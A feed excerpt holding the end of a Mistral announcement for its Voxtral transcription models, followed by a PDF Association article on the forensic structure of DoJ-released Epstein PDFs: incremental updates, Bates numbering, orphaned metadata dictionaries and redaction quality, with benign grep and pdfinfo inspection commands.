<p><img src="https://cms.mistral.ai/assets/58664549-fe38-420a-86fd-5c7003476689.png?width=1775&amp;height=1111" alt="Voxtral 2.0   Transcription Performance Fleurs   Priceper Min"></p>
<p><em>Average word error rate (lower is better) across the top-10 languages in the FLEURS transcription benchmark.</em></p>
<p>Voxtral Mini Transcribe V2 delivers significant improvements in transcription and diarization quality across languages and domains. At approximately 4% word error rate on FLEURS and $0.003/min, Voxtral offers the best price-performance of any transcription API. It outperforms GPT-4o mini Transcribe, Gemini 2.5 Flash, Assembly Universal, and Deepgram Nova on accuracy, and processes audio approximately 3x faster than ElevenLabs’ Scribe v2 while matching on quality at one-fifth the cost.</p>
<h3 dir="ltr">Enterprise-ready features.</h3>
<p dir="ltr">Voxtral Mini Transcribe V2 introduces key capabilities for enterprise deployments.</p>
<div>
<div><p><img src="https://cms.mistral.ai/assets/4b23530e-23c1-4a58-8296-c61a1d5cff98.png?width=96&amp;height=96" alt="Icon Language"></p><h4>Speaker diarization.</h4>
<p dir="ltr">Generate transcriptions with speaker labels and precise start/end times. Ideal for meeting transcription, interview analysis, and multi-party call processing. Note: with overlapping speech, the model typically transcribes one speaker.</p>
</div>
<div><p><img src="https://cms.mistral.ai/assets/221e1a35-1b56-41a1-b294-6e5a3492e0cd.png?width=72&amp;height=64" alt="Icon Filters"></p><h4>Context biasing.</h4>
<p dir="ltr">Provide up to 100 words or phrases to guide the model toward correct spellings of names, technical terms, or domain-specific vocabulary. Particularly useful for proper nouns or industry terminology that standard models often miss. Context biasing is optimized for English; support for other languages is experimental.</p>
</div>
<div><p><img src="https://cms.mistral.ai/assets/e8c644a8-93bf-49c0-ae96-a859c1cec3ad.svg?width=32&amp;height=32" alt="Word-level timestamps."></p><h4>Word-level timestamps.</h4>
<p dir="ltr">Generate precise start and end timestamps for each word, enabling applications like subtitle generation, audio search, and content alignment.</p>
</div>
</div>
<div>
<div><p><img src="https://cms.mistral.ai/assets/ecdac1ed-522e-4a58-a3cc-23d03c40ba6e.png?width=96&amp;height=96" alt="Icon Earth Black"></p><h4>Expanded language support.</h4>
<p dir="ltr">Like Realtime, this model now supports 13 languages: English, Chinese, Hindi, Spanish, Arabic, French, Portuguese, Russian, German, Japanese, Korean, Italian, and Dutch. Non-English performance significantly outpaces competitors.</p>
</div>
<div><p><img src="https://cms.mistral.ai/assets/ec93c74e-5cdd-4950-b494-0a8f3a43dd74.svg?width=32&amp;height=32" alt="Noise robustness."></p><h4>Noise robustness.</h4>
<p dir="ltr">Maintains transcription accuracy in challenging acoustic environments, such as factory floors, busy call centers, and field recordings.</p>
</div>
<div><p><img src="https://cms.mistral.ai/assets/d18e43b2-1c42-4916-b787-d28739220476.svg?width=32&amp;height=32" alt="Longer audio support."></p><h4>Longer audio support.</h4>
<p dir="ltr">Process recordings up to 3 hours in a single request.</p>
</div>
</div>
<p dir="ltr"><img src="https://cms.mistral.ai/assets/97f4a4ee-7448-4a2f-889e-17409821e503.png?width=2849&amp;height=1358" alt="FlEURS"></p>
<p><em>Word error rate (lower is better) across languages in the FLEURS transcription benchmark.</em></p>
<h2 dir="ltr">Audio playground.</h2>
<p dir="ltr">Test Voxtral Transcribe 2 directly in <a href="https://console.mistral.ai/build/audio/speech-to-text">Mistral Studio</a>. Upload up to 10 audio files, toggle diarization, choose timestamp granularity, and add context bias terms for domain-specific vocabulary. Supports .mp3, .wav, .m4a, .flac, .ogg up to 1GB each.</p>
<p dir="ltr"><iframe title="YouTube video player" src="https://www.youtube.com/embed/93ZAhW3bk8g" width="560" height="315" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe></p>
<h2 dir="ltr">Transforming voice applications.</h2>
<p dir="ltr">Voxtral powers voice workflows in diverse applications and industries.</p>
<ul>
<li>
<h3 dir="ltr">Meeting intelligence.</h3>
<p dir="ltr">Transcribe multilingual recordings with speaker diarization that clearly attributes who said what and when. At Voxtral's price point, annotate large volumes of meeting content at industry-leading cost efficiency.</p>
</li>
<li>
<h3 dir="ltr">Voice agents and virtual assistants.</h3>
<p dir="ltr">Build conversational AI with sub-200ms transcription latency. Connect Voxtral Realtime to your LLM and TTS pipeline for responsive voice interfaces that feel natural.</p>
</li>
<li>
<h3 dir="ltr">Contact center automation.</h3>
<p dir="ltr">Transcribe calls in real time, enabling AI systems to analyze sentiment, suggest responses, and populate CRM fields while conversations are still happening. Speaker diarization ensures clear attribution between agents and customers.</p>
</li>
<li>
<h3 dir="ltr">Media and broadcast.</h3>
<p dir="ltr">Generate live multilingual subtitles with minimal latency. Context biasing handles proper nouns and technical terminology that trip up generic transcription services.</p>
</li>
<li>
<h3 dir="ltr">Compliance and documentation.</h3>
<p dir="ltr">Monitor and transcribe interactions for regulatory compliance, with diarization providing clear speaker attribution and timestamps enabling precise audit trails.</p>
</li>
</ul>
<p dir="ltr">Both models support GDPR and HIPAA-compliant deployments through secure on-premise or private cloud setups.</p>
<h2 dir="ltr">Get started.</h2>
<p dir="ltr"><a href="https://docs.mistral.ai/models/voxtral-mini-transcribe-26-02">Voxtral Mini Transcribe V2</a> is available now via API at $0.003 per minute. Try it now in the new Mistral Studio <a href="https://console.mistral.ai/build/audio/speech-to-text">audio playground</a> or in <a href="http://chat.mistral.ai/">Le Chat</a>.</p>
<p dir="ltr"><a href="https://docs.mistral.ai/models/voxtral-mini-transcribe-realtime-26-02">Voxtral Realtime</a> is available via API at $0.006 per minute and as open weights on <a href="https://huggingface.co/mistralai/Voxtral-Mini-3B-Realtime-2602">Hugging Face</a>.</p>
<p dir="ltr"><a href="https://docs.mistral.ai/capabilities/audio_transcription">Explore documentation</a> on Mistral’s audio and transcription capabilities.</p>
<h2 dir="ltr">We’re hiring.</h2>
<p dir="ltr">If you're excited about building world-class speech AI and putting frontier models into the hands of developers everywhere, we'd love to hear from you. <a href="https://mistral.ai/careers">Apply to join our team</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A case study in PDF forensics: The Epstein PDFs (189 pts)]]></title>
            <link>https://pdfa.org/a-case-study-in-pdf-forensics-the-epstein-pdfs/</link>
            <guid>46886440</guid>
            <pubDate>Wed, 04 Feb 2026 14:46:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pdfa.org/a-case-study-in-pdf-forensics-the-epstein-pdfs/">https://pdfa.org/a-case-study-in-pdf-forensics-the-epstein-pdfs/</a>, See on <a href="https://news.ycombinator.com/item?id=46886440">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>The recent release of a <a href="https://www.justice.gov/epstein/doj-disclosures" target="_blank" rel="noopener">tranche of files</a> by the US Department of Justice (DoJ) under the “Epstein Files Transparency Act (H.R.4405)” has once again prompted many people to closely examine redacted and sanitized PDF documents. Our previous articles on the <a href="https://pdfa.org/corruption-in-pdf-federal-crimes-edition/">Manafort papers</a> and the <a href="https://pdfa.org/a-technical-and-cultural-assessment-of-the-mueller-report-pdf/">Mueller report</a>, as well as a study by Adhatarao, S. and Lauradoux, C. (2021) “<a href="https://doi.org/10.1145/3437880.3460405" target="_blank" rel="noopener">Exploitation and Sanitization of Hidden Data in PDF Files: Do Security Agencies Sanitize Their PDF files?</a>,” in <em>Proceedings of the 2021 ACM Workshop on Information Hiding and Multimedia Security</em>, illustrate the importance of robust sanitization and redaction workflows when handling sensitive documents prior to release.</p>
<p>This article examines a small random selection of the Epstein PDF files from a purely digital forensic perspective, focusing on the PDF syntax and idioms they contain, any malformations or unusual constructs, and other technical aspects.</p>
<p>PDFs are more challenging to analyze than many other formats because they are binary files that require specialized knowledge, expertise, and software. Please note that we did not analyze the contents of the PDF documents. Not every PDF was examined. Any mention of products (or appearance in screen-shots) does not imply any endorsement or support of any information, products, or providers whatsoever. We are not lawyers; this article does not constitute legal advice</p>
<p>We offer this information, in part, as some of the Epstein PDFs released by DoJ are beginning to appear on malware analysis sites (such as <a href="https://hybrid-analysis.com/sample/d8f6ba273d416f1b3160b94b5646374b218a9ecef9d2cb3ae33cd3788f8f862b/6946599fcca0461fcc056ab2" target="_blank" rel="noopener">Hybrid-Analysis</a>) with various kinds of incorrect analysis and misinformation.</p>
<h2 id="26-december-2025-update">26 December 2025 update</h2>
<p>After we'd completed our analysis the DoJ released a new dataset, <a href="https://www.justice.gov/epstein/files/DataSet%208.zip">DataSet 8.zip</a>. This new ZIP file is 9.95 GB compressed and contains over 11,000 files, including 10,593 new PDFs totaling 1.8 GB and 29,343 pages (the longest document has 1,060 pages). DataSet 8 also contains many large MP4 movies, Excel spreadsheets, and various other files. The first PDF in the set of 10,593 PDFs is VOL00008\IMAGES\0001\EFTA00009676.pdf, and the last file is VOL00008\IMAGES\0011\EFTA00039023.pdf. A cursory analysis shows <span>pdfinfo</span> properties similar to those from the earlier datasets, but we have not otherwise analyzed this new dataset.</p>
<p>Since our original post, various social media and news platforms have also been announcing “recoverable redactions” from the “Epstein Files”. We stand by our analysis; DoJ has correctly redacted the EFTA PDFs in Datasets 01-07, and they <b><i>do not contain</i></b> recoverable text as alleged. As our article states, we did not analyze any other DoJ or Epstein-related documents.</p>
<p>For example, the featured image in <a href="https://www.theguardian.com/us-news/2025/dec/23/epstein-unredacted-files-social-media">this Guardian news article</a> (which was also picked up by the <a href="https://www.nytimes.com/2025/12/23/us/politics/epstein-files-redactions-doj.html">New York Times</a>) corresponds to VOL00004\IMAGES\0001EFTA00005855.pdf, as can be easily determined by searching for the Bates Numbers in the EFTA “.OPT” data files. The information in this EFTA PDF is <b><i>fully and correctly redacted</i></b>; there is <b><i>no hidden information</i></b>. The only extractable text is some garbled text from the poor-quality OCR and, as expected, the Bates Numbers on each page.</p>
<p>In the few reports we investigated (including from <a href="https://www.forbes.com/sites/daveywinder/2025/12/26/epstein-files-hacked---all-you-need-to-know">Forbes</a> and Ed Krassenstein on both <a href="https://x.com/EdKrassen/status/2003222444270661801">X (formerly Twitter)</a> and <a href="https://www.instagram.com/krassensteins?igsh=eGYyc3gwZXA2eW4=">Instagram</a>), these stories misrepresent <strong><i>other</i></strong> DoJ files that were <b><i>not</i></b> part of the major DataSets 01-07 release on December 19 under the EFTA. All PDFs released under EFTA have a Bates Number on every page starting "EFTA". These include “<a href="https://www.justice.gov/multimedia/Court%20Records/Government%20of%20the%20United%20States%20Virgin%20Islands%20v.%20JPMorgan%20Chase%20Bank,%20N.A.,%20No.%20122-cv-10904%20(S.D.N.Y.%202022)/001-01.pdf">Case 1:22-cv-10904-JSR &nbsp; Document 1-1,&nbsp; Exhibit 1 to Government’s Complaint against JPMorgan Chase Bank, N.A.</a>” (see page 41) and “<a href="https://www.justice.gov/multimedia/Court%20Records/Matter%20of%20the%20Estate%20of%20Jeffrey%20E.%20Epstein,%20Deceased,%20No.%20ST-21-RV-00005%20(V.I.%20Super.%20Ct.%202021)/2022.03.17-1%20Exhibit%201.pdf">Case No: ST-20-CV-14 Government Exhibit 1</a>” (see page 19). These PDFs, previously released by the DoJ, do contain incorrect and ineffective redactions, with black boxes that simply obscure text, making “copy &amp; paste” easy to recover the text that's otherwise hidden. Clearly, DoJ processes and systems in the past have inadequately redacted information!</p>
<h2 id="the-files-we-examined">The files we examined</h2>
<p>The tranche released by DoJ on Friday, December 19 is available as seven “data sets”, most easily downloaded as seven ZIP archives totaling just under 2.97 GB. Each ZIP file contains a similar folder structure, with DataSet 6 being the odd one out with an extra top-level folder. Once unzipped, the total size is 2.99 GB. The tranche contains 4,085 PDF files, a single AVI (movie) file (located in the folder VOL00002\NATIVES\0001), and 2 data files (.DAT and .OPT) for each ZIP archive. The “.OPT” files appear to be CSV (<a href="https://en.wikipedia.org/wiki/Comma-separated_values" target="_blank" rel="noopener">Comma-Separated Values</a>) but lack a heading row, while the “.DAT” files contain information about the <a href="https://en.wikipedia.org/wiki/Bates_numbering" target="_blank" rel="noopener">Bates numbering</a>. The analysis we provide here is limited to the PDF files.</p>
<p>The PDF files are named and ordered sequentially within the folder structure, starting with “EFTA00000001.pdf” in VOL00001 and ending with “EFTA00009664.pdf” in VOL00007, indicating that <span><strong>at least 5,879 PDF files remain unreleased</strong></span>.</p>
<p>A random sampling of the PDFs for visual review suggests that they are a mix of single and multi-page full-page photos and scanned content. OCR (Optical Character Recognition) was used to provide some searchable and extractable text in at least some files. “Black box” style redactions (without text reasons) are apparent. When done correctly, this is the appropriate way to redact, far more robust than <a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/stop-pixelating-new-tool-reveals-the-secrets-of-redacted-documents" target="_blank" rel="noopener">pixelating text</a>. The PDFs we sampled did not include any obviously “born digital” documents. Various news sites are reporting <a href="https://www.cbsnews.com/news/epstein-files-redaction-over-500-pages-entirely-blacked-out/" target="_blank" rel="noopener">very heavily redacted documents</a> within this tranche.</p>
<h2 id="file-validity">File validity</h2>
<p>A precursor to most forensic examinations is to establish whether the PDF files are technically valid (that is, conform to the rules of the PDF format), since analyzing malformed files can easily lead to incorrect results or wrong conclusions. Combining tools that use different methods provides the broadest possible information while ensuring that tooling limitations are fully understood. However, if the basic file structure or cross-reference information is incorrect, various software might then draw different conclusions and/or construct different Document Object Models (DOMs).</p>
<p>In addition to basic file structure, incremental updates (if any), and cross-reference information, PDF validity assessments include the objects that comprise the PDF’sDOM as well as the file structure, incremental updates, and cross-reference information. To assess relationships between objects in the PDF DOM, some forensic analysis tools leverage our <a href="https://github.com/pdf-association/arlington-pdf-model" target="_blank" rel="noopener">Arlington PDF Data Model</a>, while others use their own internal methods.</p>
<p>Our analysis of file validity, using a multitude of PDF forensic tools, identified only one minor defect (invalidity); 109 PDFs had a positive FontDescriptor <strong>Descent</strong> value rather than a negative one. This is a relatively common (but minor) error, typically associated with font substitution and font matching, that does not affect the validity of the files overall. One specific forensic tool reported a PDF version issue with some files, related to the document catalog <strong>Version</strong> entry, which prevented the tool from further verifying those specific PDFs.</p>
<h2 id="pdf-versions">PDF versions</h2>
<p>I’ve previously written about the <a href="https://pdfa.org/pdf-versions/">unreliability of PDF version numbers</a>. Still, for forensic purposes, they may provide insight into the DoJ’s software, and whether improved software could have performed better.</p>
<p>I used two different but commonly used PDF command-line <code>pdfinfo</code> utilities on different platforms (Windows and Ubuntu Linux) to summarize information about these PDF files. When run against the full tranche of PDFs, I got two very different sets of answers! Immediately, my <a href="https://en.wiktionary.org/wiki/Spidey_sense#English" target="_blank" rel="noopener">spidey senses</a> started to tingle, and I was once again reminded of a key lesson in digital document forensics – you should <em><span>never</span></em> trust a single tool!</p>
<table>
<tbody>
<tr>
<td><strong>Reported PDF Version</strong></td>
<td><strong>Count Tool A</strong></td>
<td><strong>Count Tool B</strong></td>
</tr>
<tr>
<td>1.3</td>
<td>209</td>
<td>3,817</td>
</tr>
<tr>
<td>1.4</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>1.5</td>
<td>3,875</td>
<td>267</td>
</tr>
<tr>
<td><strong>TOTAL</strong> <em>(should be 4,085)</em></td>
<td>4,085</td>
<td>4,085</td>
</tr>
</tbody>
</table>

<p>The PDF version in the file header, “<code>%PDF-<em>x.y</em></code>”, is nominally the first line in every PDF file (based on the not-unreasonable assumption that the PDF files have no “junk bytes” before this PDF file identifier). Using the Linux command line, you can run in Linux “<code>head -n 1 <em>file.pdf</em></code>” to extract the first header line from each PDF and compare it with the reported results from each tool. Or run in Linux “<code>grep -P --text --byte-offset "%PDF-\d\.\d" *.pdf</code>” to confirm that there are no junk bytes prior to the PDF header line.</p>
<p>The reason for the difference reported in the table above is that Tool B is not accounting for the <strong>Version</strong> entry in the document catalog of PDFs with incremental updates. We’ll next investigate whether this is due to malformed files or a programming error. When properly accounting for incremental updates, however, Tool A is correct.</p>
<p>Using the same <code>pdfinfo</code> output (and again comparing results from both tools), we can also quickly establish the following facts:</p>
<ul>
<li>No PDF is tagged</li>
<li>No PDF is encrypted</li>
<li>No PDF is “optimized” (technically, Linearized PDF)</li>
<li>No PDF has any annotations</li>
<li>No PDF has any outlines (bookmarks)</li>
<li>No PDF contains any embedded files</li>
<li>None of the PDFs are forms</li>
<li>None of the PDFs contains JavaScript</li>
</ul>
<p>Page counts range from 1 (in 3,818 PDFs) to 119 pages (in two PDFs), totaling 9,659 pages across all 4,085 PDFs.</p>
<h2 id="incremental-updates">Incremental updates</h2>
<p>PDF’s incremental updates feature allows multiple revisions of a document to be stored in a PDF file. As the name implies, each set of deltas is appended to the original document, forming a chain of edits. When read by conforming PDF software, a PDF is <em><span>always</span></em> processed from the end of the file, effectively applying the deltas to the original document and to any previous incremental updates. Both the original document and each incremental update can be recognized by their respective “<code>xref</code>” and “<code>%%EOF</code>” markers (assuming that the PDF files are structured correctly).</p>
<p>For this investigation, we started by examining the very first PDF in the tranche: VOL00001\IMAGES\0001\EFTA00000001.pdf. This PDF had different PDF versions reported by different versions of <code>pdfinfo</code>. A simple trick to check if a PDF contains incremental updates is to search for these special markers while treating the PDF as a text file (<em>which it isn’t!</em>):</p>
<p><strong><code>$ grep -P --text -–byte-offset "(xref)|(%%EOF)" EFTA00000001.pdf</code></strong><br>
<code>371340:xref<br>
371758:startxref<br>
371775:%%EOF<br>
372977:startxref<br>
372994:%%EOF<br>
373961:startxref<br>
373978:%%EOF</code></p>
<p>These results (sorted by byte offset) indicate that EFTA00000001.pdf contains <em><span>two incremental updates after the original file</span></em>. The lack of an “<code>xref</code>” marker before the last two “<code>startxref</code>” markers indicate that neither incremental updates uses conventional cross-reference data, but may use cross-reference streams (if any objects are changed).</p>
<h2 id="bates-numbering">Bates numbering</h2>
<p>As referenced above, Bates numbering is the process by which every page is assigned a unique identifier. For this tranche of Epstein PDF files, Bates numbers were added to each page via a separate incremental update, as shown below in <a href="https://pdfa.org/resource/vscode-extension-pdf-cos-syntax-support/">Visual Studio Code with my pdf-cos-syntax extension</a>. Note that DoJ’s PDFs are primarily text-based internally, making forensic analysis a lot easier - and the files a lot bigger.</p>
<p><img decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/2984-3037.png" alt="Screenshot of VS Code discussed in the text." width="766" height="1284" srcset="https://pdfa.org/wp-content/uploads/2025/12/2984-3037.png 766w, https://pdfa.org/wp-content/uploads/2025/12/2984-3037-179x300.png 179w, https://pdfa.org/wp-content/uploads/2025/12/2984-3037-611x1024.png 611w, https://pdfa.org/wp-content/uploads/2025/12/2984-3037-600x1006.png 600w" sizes="(max-width: 766px) 100vw, 766px"></p>
<p>Observations:</p>
<ul>
<li>Line 2984 is the end-of-file marker for the file version, and line 2985 starts a new incremental update section.</li>
<li>Lines 2985-2987 define object 26, the unembedded Helvetica font resource used by the Bates number.</li>
<li>Lines 2997-3020 are the modified page object (object 3), replacing the page object in previous revisions of the file.</li>
<li>Line 2999 is the page Contents array, comprising five separate content streams, with the 3rd stream (object 29) being the Bates numbering added in this incremental update. Object 30 is an empty content stream that could have been removed by an optimization process.</li>
<li>Line 3034 sets the Helvetica font to 12 point.</li>
<li>Line 3037 uses a hexadecimal string to paint the Bates number onto the page.</li>
</ul>
<p>The idiom for this final incremental update, which adds the Bates number to every page, appears in all the PDF files we selected at random for investigation. This specific incremental update always uses a cross-reference stream (<code>/Type /XRef</code>) and relies on the previous incremental update, in which the document catalog <strong>Version</strong> entry is set to PDF 1.5.</p>
<h2 id="the-first-incremental-update">The first incremental update</h2>
<p>The VSCode pdf-cos-syntax extension also indicates (correctly!) that the original PDF is missing the required (when the PDF contains binary data, which most do) comment as the second line of the file that indicates to software that the PDF file needs to be treated as binary data (ISO 32000-2:2020, §7.5.2). Although the missing comment does not make the PDF invalid per se, without such a marker close to the top of each PDF, software may think the PDF is a text file, and thus potentially corrupt the PDF by changing line endings, which would break the byte offsets in the cross-reference data. In this PDF, the first incremental update adds this marker comment after a lot of binary data, which is pointless.</p>
<p>As mentioned above, the first incremental update changed the document catalog <strong>Version</strong> entry to PDF 1.5, as we see in this next screenshot:</p>
<p><img decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/2924-3000.png" alt="Screenshot of VS Code discussed in the text." width="766" height="1284" srcset="https://pdfa.org/wp-content/uploads/2025/12/2924-3000.png 766w, https://pdfa.org/wp-content/uploads/2025/12/2924-3000-179x300.png 179w, https://pdfa.org/wp-content/uploads/2025/12/2924-3000-611x1024.png 611w, https://pdfa.org/wp-content/uploads/2025/12/2924-3000-600x1006.png 600w" sizes="(max-width: 766px) 100vw, 766px"></p>
<p><span>Observations:</span></p>
<ul>
<li><span>Lines 2953-2984 are the incremental update section.</span></li>
<li><span>Line 2954 is a PDF comment. PDF comments always start with a PERCENT SIGN (<code>%</code>) and may occur in many places in PDF files. Effective sanitization and redaction workflows typically remove all comments from PDFs because they may inadvertently disclose information, but this exact comment appears in 3,608 other PDF files. The origin or meaning of this comment was not further investigated.</span></li>
<li><span>Line 2964 upgrades the PDF version to 1.5. At first glance, this may appear to be perfectly valid PDF, but it is technically incorrect because the file header is <code>%PDF-1.3</code> yet the <strong>Version</strong> key was only added in PDF 1.4 - this is what the strict file validation tool mentioned above had noticed. As object 24 is a compressed object stream (lines 2966-2973) and object 25 is a compressed cross-reference stream (lines 2974-2981), the indicated version should be PDF 1.5. As a practical matter, however, this level of technical detail does not impact operation or behavior of PDFs.</span></li>
<li><span>Line 2984 is the end-of-section “<code>%%EOF</code>” marker for this incremental update section.</span></li>
</ul>
<p><span>As this section of the PDF uses compressed object streams, specialized PDF forensic tools must be used… simple search methodologies, such as those mentioned above, may not identify everything!</span></p>
<p><span>We know that there are 7 objects (because we find /<code>N 7</code>) inside the object stream:</span></p>
<p><img loading="lazy" decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/pdf-debugger.png" alt="Screenshot of debugger displaying content discussed in the text." width="676" height="443" srcset="https://pdfa.org/wp-content/uploads/2025/12/pdf-debugger.png 676w, https://pdfa.org/wp-content/uploads/2025/12/pdf-debugger-300x197.png 300w, https://pdfa.org/wp-content/uploads/2025/12/pdf-debugger-600x393.png 600w" sizes="auto, (max-width: 676px) 100vw, 676px"></p>
<p><span>As per PDF’s specification, ISO 32000-2:2020, §7.5.7, the first line of integers is interpreted as N pairs, where the first integer is the object number and the second integer is the byte offset relative to the first object in the object stream.</span></p>
<table>
<tbody>
<tr>
<td><strong>N</strong></td>
<td><strong>1st integer (object number)</strong></td>
<td><strong>2nd integer (start offset)</strong></td>
<td><strong>Explanation</strong></td>
<td><strong>Content</strong></td>
</tr>
<tr>
<td>1</td>
<td>19</td>
<td>0</td>
<td>Type1 Font object for OPBaseFont0 (Courier)</td>
<td><span>&lt;&lt;/BaseFont/Courier/Encoding&lt;&lt;/BaseEncoding/WinAnsiEncoding/Type/Encoding&gt;&gt;/Name/OPBaseFont0/Subtype/Type1/Type/Font&gt;&gt;</span></td>
</tr>
<tr>
<td>2</td>
<td>20</td>
<td>118</td>
<td>Type1 Font object for OPBaseFont1 (Helvetica)</td>
<td><span>&lt;&lt;/BaseFont/Helvetica/Encoding&lt;&lt;/BaseEncoding/WinAnsiEncoding/Type/Encoding&gt;&gt;/Name/OPBaseFont1/Subtype/Type1/Type/Font&gt;&gt;</span></td>
</tr>
<tr>
<td>3</td>
<td>17</td>
<td>238</td>
<td>Document information (Info) dictionary</td>
<td><span>&lt;&lt;/CreationDate(D:20251218143205)/Creator(OmniPage CSDK 21.1)/ModDate(D:20251218143205)/Producer(Processing-CLI)&gt;&gt;</span></td>
</tr>
<tr>
<td>4</td>
<td>18</td>
<td>352</td>
<td>ProcSet resources array</td>
<td><span>[/PDF/Text/ImageB/ImageC/ImageI]</span></td>
</tr>
<tr>
<td>5</td>
<td>22</td>
<td>384</td>
<td>Resources dictionary for the page</td>
<td><span>&lt;&lt;/Font&lt;&lt;/OPBaseFont0 19 0 R/OPBaseFont1 20 0 R&gt;&gt;/ProcSet 18 0 R/XObject&lt;&lt;/Im0 8 0 R&gt;&gt;&gt;&gt;</span></td>
</tr>
<tr>
<td>6</td>
<td>23</td>
<td>472</td>
<td>Array of 2 indirect references (to content streams)</td>
<td><span>[21 0 R 4 0 R]</span></td>
</tr>
<tr>
<td>7</td>
<td>3</td>
<td>486</td>
<td>Updated Page object</td>
<td><span>&lt;&lt;/Contents 23 0 R/MediaBox[0 0 864 576.75]/Parent 2 0 R/Resources 22 0 R/Thumb 11 0 R/Type/Page&gt;&gt;</span></td>
</tr>
</tbody>
</table>

<p>What is very interesting here – from a PDF forensics perspective – is the fact of a <strong><em><span>hidden document information dictionary</span></em></strong> that is not referenced from the last (final) incremental update trailer (i.e., there is no <strong>Info</strong> entry in object 31, lines 3050-3063 below). As such, this orphaned dictionary is invisible to PDF software! This oddity occurs in all other PDFs we’d randomly selected for investigation.</p>
<p><img loading="lazy" decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/2985-3067.png" alt="Screenshot of VS Code discussed in the text." width="777" height="1144" srcset="https://pdfa.org/wp-content/uploads/2025/12/2985-3067.png 777w, https://pdfa.org/wp-content/uploads/2025/12/2985-3067-204x300.png 204w, https://pdfa.org/wp-content/uploads/2025/12/2985-3067-695x1024.png 695w, https://pdfa.org/wp-content/uploads/2025/12/2985-3067-768x1131.png 768w, https://pdfa.org/wp-content/uploads/2025/12/2985-3067-600x883.png 600w" sizes="auto, (max-width: 777px) 100vw, 777px"></p>
<p><span>Formatted nicely as an uncompressed object, this hidden document information dictionary inside the compressed object stream contains the following information (the CreationDate and ModDate appear to change in other randomly examined PDFs):</span></p>
<pre>     17 0 obj
     &lt;&lt;
          /CreationDate (D:20251218143205)
          /ModDate      (D:20251218143205)
          /Creator      (OmniPage CSDK 21.1)
          /Producer     (Processing-CLI)
     &gt;&gt;
     endobj</pre>
<p>This metadata clearly indicates the software DoJ used to manipulate these PDF files. Although not relevant to the content, this forensic discovery clearly shows that extra care is required when sanitizing PDFs.</p>
<h2 id="different-incremental-updates">Different incremental updates</h2>
<p>Another randomly selected PDF, VOL00003\IMAGES\0001\EFTA00003939.pdf contains 3 full-page images, and just a single incremental update that applies the Bates numbering. However, in this case the file header is <code>%PDF-1.5</code> yet both the original PDF and incremental update use conventional cross-reference tables! This isn’t problematic, but is certainly unexpected and inefficient since PDF 1.5 introduced compressed cross-reference streams.</p>
<p>By comparing the objects in the incremental cross-reference table to the original cross-reference table we can see that objects 66 to 69 – the 3 Page objects for the 3 page document – were redefined. This is just what is expected in order to add the Bates number to each page’s <strong>Contents</strong> stream as in the previous example.</p>

<p>Our initial examination using pdfinfo utilities did not identify any metadata in any of the PDFs in the tranche, either in the document information dictionary (PDF file trailer Info entry) or as an XMP metadata stream (<strong>Metadata</strong> entry).</p>
<p>However, since we know that (a) the tranche includes PDFs with incremental updates, and (b) that an orphaned document information dictionary exists, all revisions of a document should be thoroughly examined. Incremental updates may have marked other document information dictionaries or XMP metadata streams as free but not deleted the actual data.</p>
<p>XMP metadata is always encoded in PDF as a stream object, and since stream objects cannot be in compressed object streams, using forensic tools to search for keys “<code>/XML</code>” or “<code>/Metadata</code>” should always locate them. All modern office suites and PDF creation applications will generate XMP metadata when exporting to PDF. As XMP is usually uncompressed, searching for XML fragments may also be helpful (see below for an example XMP object fragment).</p>
<pre>     3 0 obj
     &lt;&lt;/Length 36996/Subtype/XML/Type/Metadata&gt;&gt;
     stream
     &lt;?xpacket begin="ï»¿" id="W5M0MpCe … zNTczkc9d"?&gt;
     &lt;x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk=" … "&gt;
         &lt;rdf:RDF 
     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"&gt;
              &lt;rdf:Description rdf:about=""
                   xmlns:dc="http://purl.org/dc/elements/1.1/"
                   xmlns:xmp="http://ns.adobe.com/xap/1.0/"
     ...</pre>
<p>Not unsurprisingly for properly-redacted files, we did not find any XMP metadata streams or XML in any PDF. As a consequence, none of the PDFs can declare conformance to either PDF/A (ISO 19005 for long-term archiving) or PDF/UA (ISO 14289 for accessibility). Of course, as untagged PDFs, the files cannot conform to accessibility specifications such as PDF/UA or WCAG in any event. Additionally, none of the PDFs appear to include device-independent color spaces.</p>
<p>The presence of an <strong>Info</strong> entry in the trailer dictionary or (in PDFs with cross-reference streams) in the cross-reference stream dictionary indicates the presence of document information dictionaries. “<code>/Info</code>” does indeed occur in many of the PDFs, including multiple times in some PDFs, indicating potential changes via incremental updates. However, as discovered above, in some cases the final incremental update does not include an <strong>Info</strong> entry, thus “orphaning” any existing document information dictionaries.</p>
<p>ISO 32000-2:2020, Table 349 lists the defined entries in PDF’s document information dictionary (<strong>Title</strong>, <strong>Author</strong>, <strong>Subject</strong>, etc). Any vendor may add additional entries (such as <a href="https://developer.apple.com/documentation/coregraphics/kcgpdfcontextkeywords" target="_blank" rel="noopener">Apple does with its <span>/AAPL:Keywords</span> entry</a>), so redaction and sanitization software should be aware of extra entries.</p>
<p>From our random sampling, we identified one PDF with a non-trivial document information dictionary still present: VOL00002\IMAGES\0001\EFTA00003212.pdf. This is shown below in <a href="https://pdfa.org/resource/vscode-extension-pdf-cos-syntax-support/">Visual Studio Code with my pdf-cos-syntax extension</a>:</p>
<p><img loading="lazy" decoding="async" src="https://pdfa.org/wp-content/uploads/2025/12/1-69.png" alt="Screenshot of VS Code discussed in the text." width="766" height="1284" srcset="https://pdfa.org/wp-content/uploads/2025/12/1-69.png 766w, https://pdfa.org/wp-content/uploads/2025/12/1-69-179x300.png 179w, https://pdfa.org/wp-content/uploads/2025/12/1-69-611x1024.png 611w, https://pdfa.org/wp-content/uploads/2025/12/1-69-600x1006.png 600w" sizes="auto, (max-width: 766px) 100vw, 766px"></p>
<p><span>Of additional interest in this specific PDF is that the comment at line 60 has survived DoJ’s sanitization and redaction workflow! Other PDF comments may therefore also be present in other files.</span></p>
